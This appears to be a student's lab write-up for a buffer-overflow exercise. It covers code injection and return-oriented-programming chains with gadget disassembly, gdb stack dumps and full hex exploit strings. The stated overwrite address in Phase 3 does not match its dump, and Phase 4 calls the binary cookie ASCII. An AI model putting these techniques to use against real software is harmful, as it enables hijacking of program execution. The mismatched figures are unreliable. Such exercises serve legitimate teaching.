# Attack Lab
## Phase 1:
No new code is injected. Overflow the buffer to redirect execution into `touch1()`.

## Phase 2:
Redirect execution into injected in the buffer, to modify argument (%rdi) to cookie:
```
movq $0x59b997fa, %rdi
```
Also, PUSH address of `touch2()` into stack (which also decrements %esp):
```
push $0x004017ec        # Address of touch2()
```
After executing RET, `touch2()` is executed.

## Phase 3:
Phase 3 is similar to phase 2, except that additional space is needed in stack to store cookie in ASCII. The stack before executing `getbuf()` has the following layout:
```
(gdb) x /20w 0x5561dc78
0x5561dc78:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc98:	0x55586000	0x00000000	0x00401976	0x00000000
0x5561dca8:	0x00000002	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x00000000	0x00000000	0xf4f4f4f4	0xf4f4f4f4
```
The stack after executing `getbuf()` has the following layout:
```
(gdb) x /20w 0x5561dc78
0x5561dc78:	0x60dcb8bf	0x2534ff55	0x004018fa	0x000000c3
0x5561dc88:	0x00000000	0x00000000	0x00000000	0x00000000
0x5561dc98:	0x00000000	0x00000000	0x5561dc78	0x00000000
0x5561dca8:	0x00000002	0x00000000	0x00401f24	0x00000000
0x5561dcb8:	0x39623935	0x61663739	0xf4f4f400	0xf4f4f4f4
```
Where:
* 0x5561dc78 - 0x5561dc9f is the `getbuf()` buffer, which will be injected with instructions:
    ```
    movq $0x5561dcb8, %rdi
    push $0x4018fa          # Address of touch3()
    ret
    ```
* 0x5561dca0 - 0x5561dca7 will be overflowed with address of 0x5561dc88 (to redirect the execution into injected after hitting RET of `getbuf()`
* 0x5561dcb8 - 0x5561dcbf is empty, in which we fill in the cookie in ASCII.
* Others: Should not be modified.  

Overflow the buffer as described above.  

## Phase 4:
Found the following pattern matching desired instructions:
* Overflow the buffer with cookie ASCII, then save it in %rax:
    ```
    00000000004019a7 <addval_219>:
    4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
    4019ad:   c3                      retq    
    ```
    In which we have
    ```
    58          pop %rax
    90          no-op
    c3          retq
    ```
* Move cookie from %rax to %rdi:
    ```
    00000000004019c3 <setval_426>:
    4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
    4019c9:   c3                      retq
    ```
    In which we have
    ```
    48 89 c7    movq %rax, %rdi
    90          no-op
    c3          retq
    ```
So, we can overflow the buffer with:
```
00 00 00 00 00 00 00 00     # Padding
00 00 00 00 00 00 00 00     # Padding
00 00 00 00 00 00 00 00     # Padding
00 00 00 00 00 00 00 00     # Padding
00 00 00 00 00 00 00 00     # Padding
ab 19 40 00 00 00 00 00     # Address of 1st gadget
fa 97 b9 59 00 00 00 00     # Cookie in ASCII
c5 19 40 00 00 00 00 00     # Address of 2nd gadget
ec 17 40 00 00 00 00 00     # Address of touch2()
```

## Phase 5:
The cookie can be injected into stack by overflowing the buffer. However, since the stack initializes randomly, we have to use either `lea` or `movq %rsp, %xxx` to get the cookie address.  
* Locating the stack:
    ```
    0000000000401a03 <addval_190>:
    401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax
    401a09:	c3  
    ```
    In which we have
    ```
    48 89 e0  movq %rsp, %rax
    c3        ret
    ```
* Because no `popq` instructions exists, we put the cookie string somewhere near the bottom of the stack, away from the gadgets:
    ```
    00000000004019d6 <add_xy>:
    4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
    4019da:	c3                   	retq   
    ```
    In which we have
    ```
    04 37     add $0x37, %al
    c3        ret
    ```
* Move cookie address from %rax to %rdi:
    ```
    00000000004019c3 <setval_426>:
    4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
    4019c9:	c3                   	retq
    ```
    In which we have
    ```
    48 89 c7  movq %rax, %rdi
    90        nop
    c3        retq
    ```
Overflow the buffer with:
```
00 00 00 00 00 00 00 00     # Padding
00 00 00 00 00 00 00 00     # Padding
00 00 00 00 00 00 00 00     # Padding
00 00 00 00 00 00 00 00     # Padding
00 00 00 00 00 00 00 00     # Padding
06 1a 40 00 00 00 00 00     # Address of the 1st gadget
d8 19 40 00 00 00 00 00     # Address of the 2nd gadget
c5 19 40 00 00 00 00 00     # Address of the 3rd gadget
fa 18 40 00 00 00 00 00     # Address of touch3()
dd dd dd dd dd dd dd dd     # Padding
dd dd dd dd dd dd dd dd     # Padding
dd dd dd dd dd dd dd dd     # Padding
dd dd dd dd dd dd dd        # Padding (0x37(55)-24=31 in total)
35 39 62 39 39 37 66 61     # Cookie in ASCII
```
